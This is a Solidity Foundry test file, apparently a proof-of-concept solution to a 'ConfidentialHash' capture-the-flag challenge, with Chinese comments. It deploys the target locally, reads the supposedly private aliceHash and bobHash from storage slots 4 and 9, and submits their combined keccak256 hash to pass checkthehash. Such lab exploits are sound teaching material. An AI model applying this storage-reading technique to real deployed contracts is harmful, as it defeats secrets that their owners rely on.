// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {ConfidentialHash} from "../../src/confidential-hash/confidentialhash.sol";

interface ITarget {
    function checkthehash(bytes32 _hash) external view returns (bool);
}

contract ConfidentialHashPoC is Test {
    address targetAddress; // 目标合约地址

    constructor() {
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("ConfidentialHash.sol:ConfidentialHash")
        );

        address deployedAddress;
        assembly {
            deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        
        require(deployedAddress != address(0), "Deployment failed");

        targetAddress = deployedAddress;
        console.log("Deployed address: %s", deployedAddress);
    }

    function testExploit() public {
        // 读取存储槽
        bytes32 aliceHash = vm.load(targetAddress, bytes32(uint256(4))); // aliceHash 存储在槽 4
        bytes32 bobHash = vm.load(targetAddress, bytes32(uint256(9))); // bobHash 存储在槽 9

        // 计算 keccak256 哈希值
        bytes32 combinedHash = keccak256(abi.encodePacked(aliceHash, bobHash));

        // 打印结果
        emit log_bytes32(aliceHash);
        emit log_bytes32(bobHash);
        emit log_bytes32(combinedHash);

        assertEq(ITarget(targetAddress).checkthehash(combinedHash), true);
    }
}
